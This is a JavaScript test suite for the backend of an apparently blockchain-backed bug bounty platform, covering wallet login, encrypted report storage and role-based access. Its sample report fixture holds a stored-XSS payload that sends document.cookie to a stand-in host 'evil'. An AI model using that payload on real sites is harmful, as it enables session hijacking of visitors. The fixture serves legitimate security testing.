// Backend authorisation tests. The chain reader is mocked so these run without
// a blockchain; the real chain path is covered by scripts/e2e (integration).
const { test, describe, before, beforeEach } = require("node:test");
const assert = require("node:assert/strict");
const crypto = require("crypto");
const request = require("supertest");
const { Wallet } = require("ethers");
const { createApp } = require("../src/app");
const { initDb, openDb } = require("../src/db");

const W = {
  org: Wallet.createRandom(),
  verifier: Wallet.createRandom(),
  researcher: Wallet.createRandom(),
  resolver: Wallet.createRandom(),
  stranger: Wallet.createRandom(),
  otherVerifier: Wallet.createRandom(),
};
const a = (w) => w.address.toLowerCase();

function mockChain() {
  const state = {
    orgs: new Set([a(W.org)]),
    resolver: a(W.resolver),
    programs: { 1: { id: 1, owner: a(W.org), active: true, startTime: 0, endTime: 4102444800, metadataHash: "0x" } , 2: { id: 2, owner: a(W.org), active: true, startTime: 0, endTime: 4102444800 } },
    verifiers: { 1: new Set([a(W.verifier)]), 2: new Set([a(W.otherVerifier)]) },
    submissions: {},
    disputes: {},
  };
  return {
    state,
    chainId: 31337,
    address: "0x0000000000000000000000000000000000000001",
    isOrganization: async (x) => state.orgs.has(x.toLowerCase()),
    disputeResolver: async () => state.resolver,
    isVerifier: async (p, x) => !!state.verifiers[p]?.has(x.toLowerCase()),
    getProgram: async (id) => state.programs[id] || null,
    getSubmission: async (id) => state.submissions[id] || null,
    getDispute: async (id) => state.disputes[id] || { status: "None", evidenceHash: "0x" + "0".repeat(64), resolutionNoteHash: "0x" + "0".repeat(64) },
  };
}

const config = {
  encryptionKey: crypto.randomBytes(32),
  jwtSecret: crypto.randomBytes(32).toString("hex"),
  jwtTtl: "1h",
  corsOrigin: ["http://localhost:5173"],
};

const REPORT = {
  programId: 1,
  title: "Stored XSS in profile bio",
  description: "The bio field is rendered without escaping, allowing script injection.",
  affectedComponent: "/profile/edit",
  stepsToReproduce: "1. Login 2. Set bio to <script>alert(1)</script> 3. Visit profile",
  proofOfConcept: "<script>fetch('//evil/'+document.cookie)</script>",
  impact: "Session hijacking of any visitor",
  suggestedSeverity: "High",
  additionalNotes: "",
};

let app, chain, db;

async function login(wallet) {
  const n = await request(app).get("/api/auth/nonce").query({ address: wallet.address }).expect(200);
  const signature = await wallet.signMessage(n.body.message);
  const v = await request(app).post("/api/auth/verify").send({ address: wallet.address, signature }).expect(200);
  return v.body.token;
}

async function submit(token, body = REPORT) {
  const res = await request(app).post("/api/reports").set("Authorization", `Bearer ${token}`).send(body).expect(201);
  // simulate the on-chain submitReport() that the frontend performs
  const id = Object.keys(chain.state.submissions).length + 1;
  chain.state.submissions[id] = { id, programId: body.programId, researcher: a(W.researcher), reportHash: res.body.reportHash, status: "Submitted", reviewNoteHash: "0x" + "0".repeat(64) };
  return { id, reportHash: res.body.reportHash };
}

before(async () => {
  await initDb();
});

beforeEach(() => {
  db = openDb(":memory:");
  chain = mockChain();
  app = createApp({ db, chain, config });
});

describe("wallet-signature authentication", () => {
  test("valid signature yields a JWT", async () => {
    const token = await login(W.researcher);
    const me = await request(app).get("/api/auth/me").set("Authorization", `Bearer ${token}`).expect(200);
    assert.equal(me.body.address, a(W.researcher));
  });

  test("signature from a different wallet is rejected", async () => {
    const n = await request(app).get("/api/auth/nonce").query({ address: W.researcher.address });
    const sig = await W.stranger.signMessage(n.body.message);
    await request(app).post("/api/auth/verify").send({ address: W.researcher.address, signature: sig }).expect(401);
  });

  test("nonce cannot be replayed", async () => {
    const n = await request(app).get("/api/auth/nonce").query({ address: W.researcher.address });
    const signature = await W.researcher.signMessage(n.body.message);
    await request(app).post("/api/auth/verify").send({ address: W.researcher.address, signature }).expect(200);
    await request(app).post("/api/auth/verify").send({ address: W.researcher.address, signature }).expect(401);
  });

  test("protected routes require a valid token", async () => {
    await request(app).post("/api/reports").send(REPORT).expect(401);
    await request(app).post("/api/reports").set("Authorization", "Bearer forged.token.value").send(REPORT).expect(401);
  });

  test("missing body on verify returns 400, not 500", async () => {
    await request(app).post("/api/auth/verify").expect(400);
    await request(app).post("/api/auth/verify").set("Content-Type", "text/plain").send("x").expect(400);
  });

  test("invalid address rejected", async () => {
    await request(app).get("/api/auth/nonce").query({ address: "0x123" }).expect(400);
  });
});

describe("report storage", () => {
  test("report is encrypted at rest and hash is deterministic over canonical JSON", async () => {
    const token = await login(W.researcher);
    const { reportHash } = await submit(token);
    assert.match(reportHash, /^0x[0-9a-f]{64}$/);
    const row = db.prepare("SELECT * FROM reports WHERE report_hash = ?").get(reportHash);
    assert.ok(row);
    assert.ok(!row.ciphertext.includes("Stored XSS"), "plaintext must not appear in DB");
    assert.ok(!Buffer.from(row.ciphertext, "base64").toString("utf8").includes("script"), "ciphertext must not leak");
  });

  test("same content submitted twice gets different hashes (random salt)", async () => {
    const token = await login(W.researcher);
    const r1 = await request(app).post("/api/reports").set("Authorization", `Bearer ${token}`).send(REPORT).expect(201);
    const r2 = await request(app).post("/api/reports").set("Authorization", `Bearer ${token}`).send(REPORT).expect(201);
    assert.notEqual(r1.body.reportHash, r2.body.reportHash);
  });

  test("validation errors", async () => {
    const token = await login(W.researcher);
    const bad = (patch) => request(app).post("/api/reports").set("Authorization", `Bearer ${token}`).send({ ...REPORT, ...patch });
    await bad({ title: "" }).expect(400);
    await bad({ suggestedSeverity: "Extreme" }).expect(400);
    await bad({ programId: "abc" }).expect(400);
    await bad({ programId: 99 }).expect(404);
    chain.state.programs[1].active = false;
    await bad({}).expect(400);
    chain.state.programs[1].active = true;
    chain.state.programs[1].startTime = 4102444000; // not started yet
    await bad({}).expect(400);
  });

  test("program owner and program verifiers cannot submit reports", async () => {
    for (const w of [W.org, W.verifier]) {
      const t = await login(w);
      await request(app).post("/api/reports").set("Authorization", `Bearer ${t}`).send(REPORT).expect(403);
    }
  });
});

describe("restricted report access", () => {
  test("researcher, org owner and assigned verifier can read; integrity verified", async () => {
    const { id } = await submit(await login(W.researcher));
    for (const [w, role] of [[W.researcher, "researcher"], [W.org, "organization"], [W.verifier, "verifier"]]) {
      const t = await login(w);
      const r = await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${t}`).expect(200);
      assert.ok(r.body.roles.includes(role));
      assert.equal(r.body.report.title, REPORT.title);
      assert.equal(r.body.integrity.verified, true);
    }
  });

  test("stranger, verifier of another program and resolver (no dispute) are denied", async () => {
    const { id } = await submit(await login(W.researcher));
    for (const w of [W.stranger, W.otherVerifier, W.resolver]) {
      const t = await login(w);
      await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${t}`).expect(403);
    }
    const denied = db.prepare("SELECT COUNT(*) c FROM access_log WHERE allowed = 0").get().c;
    assert.equal(denied, 3);
  });

  test("resolver gains access once a dispute exists", async () => {
    const { id } = await submit(await login(W.researcher));
    chain.state.disputes[id] = { status: "Open", evidenceHash: "0x" + "1".repeat(64), resolutionNoteHash: "0x" + "0".repeat(64) };
    const t = await login(W.resolver);
    const r = await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${t}`).expect(200);
    assert.deepEqual(r.body.roles, ["dispute_resolver"]);
  });

  test("removed verifier loses access", async () => {
    const { id } = await submit(await login(W.researcher));
    chain.state.verifiers[1].delete(a(W.verifier));
    const t = await login(W.verifier);
    await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${t}`).expect(403);
  });

  test("tampered on-chain hash is detected as integrity failure / not found", async () => {
    const { id } = await submit(await login(W.researcher));
    chain.state.submissions[id].reportHash = "0x" + "a".repeat(64);
    const t = await login(W.researcher);
    await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${t}`).expect(404);
  });

  test("tampered ciphertext in DB fails decryption (GCM auth)", async () => {
    const { id, reportHash } = await submit(await login(W.researcher));
    const row = db.prepare("SELECT ciphertext FROM reports WHERE report_hash=?").get(reportHash);
    const buf = Buffer.from(row.ciphertext, "base64");
    buf[buf.length - 1] ^= 0xff;
    db.prepare("UPDATE reports SET ciphertext=? WHERE report_hash=?").run(buf.toString("base64"), reportHash);
    const t = await login(W.researcher);
    const r = await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${t}`).expect(500);
    assert.match(r.body.error, /decryption/);
  });

  test("titles endpoint only returns authorized submissions", async () => {
    const rt = await login(W.researcher);
    const { id } = await submit(rt);
    const st = await login(W.stranger);
    const r1 = await request(app).get(`/api/submissions/titles?ids=${id}`).set("Authorization", `Bearer ${st}`).expect(200);
    assert.deepEqual(r1.body, {});
    const r2 = await request(app).get(`/api/submissions/titles?ids=${id}`).set("Authorization", `Bearer ${rt}`).expect(200);
    assert.equal(r2.body[id].title, REPORT.title);
  });
});

describe("notes and evidence documents", () => {
  test("only the assigned verifier can add a review note while Submitted", async () => {
    const { id } = await submit(await login(W.researcher));
    const vt = await login(W.verifier);
    const st = await login(W.stranger);
    const rt = await login(W.researcher);
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${st}`).send({ kind: "review_note", content: "looks fine" }).expect(403);
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${rt}`).send({ kind: "review_note", content: "approve me" }).expect(403);
    const r = await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${vt}`).send({ kind: "review_note", content: "Reproduced, high impact" }).expect(201);
    chain.state.submissions[id].status = "Approved";
    chain.state.submissions[id].reviewNoteHash = r.body.docHash;
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${vt}`).send({ kind: "review_note", content: "second note" }).expect(403);
    const view = await request(app).get(`/api/submissions/${id}/report`).set("Authorization", `Bearer ${rt}`).expect(200);
    assert.equal(view.body.documents[0].anchoredOnChain, true);
    assert.equal(view.body.documents[0].integrityVerified, true);
  });

  test("dispute evidence only by researcher on Rejected; resolution note only by resolver on Disputed", async () => {
    const { id } = await submit(await login(W.researcher));
    const rt = await login(W.researcher);
    const res = await login(W.resolver);
    const evidence = { kind: "dispute_evidence", content: "Here is a video proving exploitability" };
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${rt}`).send(evidence).expect(403); // still Submitted
    chain.state.submissions[id].status = "Rejected";
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${res}`).send(evidence).expect(403);
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${rt}`).send(evidence).expect(201);
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${res}`).send({ kind: "resolution_note", content: "Overturned: valid" }).expect(403); // no dispute yet
    chain.state.submissions[id].status = "Disputed";
    chain.state.disputes[id] = { status: "Open", evidenceHash: "0x" + "1".repeat(64), resolutionNoteHash: "0x" + "0".repeat(64) };
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${rt}`).send({ kind: "resolution_note", content: "I resolve it" }).expect(403);
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${res}`).send({ kind: "resolution_note", content: "Overturned: valid" }).expect(201);
  });

  test("invalid document kind rejected", async () => {
    const { id } = await submit(await login(W.researcher));
    const vt = await login(W.verifier);
    await request(app).post(`/api/submissions/${id}/documents`).set("Authorization", `Bearer ${vt}`).send({ kind: "admin_override", content: "xxxxxx" }).expect(400);
  });
});

describe("chain failures", () => {
  test("missing contract / node down maps to 503", async () => {
    const t = await login(W.researcher);
    chain.getSubmission = async () => { const e = new Error("could not decode result data"); e.code = "BAD_DATA"; throw e; };
    await request(app).get("/api/submissions/1/report").set("Authorization", `Bearer ${t}`).expect(503);
  });
});

describe("program metadata", () => {
  const META = { title: "Acme Web", organizationName: "Acme", description: "Main web application bounty", targetSystem: "https://acme.test", inScope: "*.acme.test", outOfScope: "DoS", rules: "No social engineering" };

  test("only authorized organizations can publish; anyone can read with integrity check", async () => {
    const st = await login(W.stranger);
    await request(app).post("/api/programs/metadata").set("Authorization", `Bearer ${st}`).send(META).expect(403);
    const ot = await login(W.org);
    const r = await request(app).post("/api/programs/metadata").set("Authorization", `Bearer ${ot}`).send(META).expect(201);
    const g = await request(app).get(`/api/programs/metadata/${r.body.metadataHash}`).expect(200);
    assert.equal(g.body.metadata.title, "Acme Web");
    assert.equal(g.body.integrityVerified, true);
  });

  test("invalid metadata rejected", async () => {
    const ot = await login(W.org);
    await request(app).post("/api/programs/metadata").set("Authorization", `Bearer ${ot}`).send({ ...META, description: "short" }).expect(400);
    await request(app).get("/api/programs/metadata/nothex").expect(400);
  });
});
